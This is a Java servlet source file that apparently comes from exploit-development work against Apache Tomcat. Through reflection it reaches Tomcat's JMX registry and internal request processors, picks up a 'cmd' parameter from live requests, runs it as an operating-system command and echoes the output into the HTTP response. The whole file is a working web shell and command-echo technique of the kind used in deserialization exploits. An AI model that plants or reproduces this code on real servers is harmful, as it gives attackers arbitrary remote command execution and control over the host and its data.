import com.sun.jmx.interceptor.DefaultMBeanServerInterceptor;
import com.sun.jmx.mbeanserver.NamedObject;
import com.sun.jmx.mbeanserver.Repository;
import org.apache.coyote.RequestGroupInfo;
import org.apache.coyote.RequestInfo;
import org.apache.tomcat.util.modeler.BaseModelMBean;

import javax.management.MalformedObjectNameException;
import javax.servlet.ServletException;
import javax.servlet.annotation.WebServlet;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.BufferedInputStream;
import java.io.IOException;
import java.io.InputStream;
import java.lang.reflect.Field;
import java.util.ArrayList;
import java.util.HashSet;

@WebServlet("/demo2")
public class Test2 extends HttpServlet {
    @Override
    protected void doGet(HttpServletRequest request, HttpServletResponse resp) throws ServletException, IOException, IOException {
        try {
            com.sun.jmx.mbeanserver.JmxMBeanServer jmxMBeanServer = (com.sun.jmx.mbeanserver.JmxMBeanServer) org.apache.tomcat.util.modeler.Registry.getRegistry(null, null).getMBeanServer();
            Field mbsInterceptor = com.sun.jmx.mbeanserver.JmxMBeanServer.class.getDeclaredField("mbsInterceptor");
            mbsInterceptor.setAccessible(true);
            com.sun.jmx.interceptor.DefaultMBeanServerInterceptor defaultMBeanServerInterceptor = (DefaultMBeanServerInterceptor) mbsInterceptor.get(jmxMBeanServer);

            Field repository = defaultMBeanServerInterceptor.getClass().getDeclaredField("repository");
            repository.setAccessible(true);
            com.sun.jmx.mbeanserver.Repository repository1 = (Repository) repository.get(defaultMBeanServerInterceptor);

            HashSet<NamedObject> hashSet = (HashSet<com.sun.jmx.mbeanserver.NamedObject>) repository1.query(new javax.management.ObjectName("*:type=GlobalRequestProcessor,name=\"http*\""), null);
            for (com.sun.jmx.mbeanserver.NamedObject namedObject : hashSet ) {
                Field object = namedObject.getClass().getDeclaredField("object");
                object.setAccessible(true);
                org.apache.tomcat.util.modeler.BaseModelMBean baseModelMBean = (BaseModelMBean) object.get(namedObject);

                Field resource = baseModelMBean.getClass().getDeclaredField("resource");
                resource.setAccessible(true);
                org.apache.coyote.RequestGroupInfo requestGroupInfo = (RequestGroupInfo) resource.get(baseModelMBean);

                Field processors = requestGroupInfo.getClass().getDeclaredField("processors");
                processors.setAccessible(true);
                ArrayList<RequestInfo> processors1 = (ArrayList) processors.get(requestGroupInfo);

                // 获取response修改数据
                // 下面循环，可以在这先获取req实例，避免每次循环都反射获取一次
                Field req = RequestInfo.class.getDeclaredField("req");
                req.setAccessible(true);
                for (org.apache.coyote.RequestInfo requestInfo : processors1) {
                    org.apache.coyote.Request request1 = (org.apache.coyote.Request) req.get(requestInfo);
                    // 转换为 org.apache.catalina.connector.Request 类型
                    org.apache.catalina.connector.Request request2 = (org.apache.catalina.connector.Request) request1.getNote(1);
                    org.apache.catalina.connector.Response response1 = request2.getResponse();

                    // 获取参数
                    String cmd = request2.getParameter("cmd");
                    if (cmd != null) {
                        Process exec = Runtime.getRuntime().exec(cmd);
                        InputStream is = Runtime.getRuntime().exec(cmd).getInputStream();
                        BufferedInputStream bis = new BufferedInputStream(is);
                        int len;
                        while ((len = bis.read()) != -1) {
                            response1.getWriter().write(len);
                        }
                    }
                }
            }


        } catch (NoSuchFieldException | IllegalAccessException | MalformedObjectNameException e) {
            e.printStackTrace();
        }

    }

    @Override
    protected void doPost(HttpServletRequest request, HttpServletResponse resp) throws ServletException, IOException {
        this.doGet(request,resp);

    }
}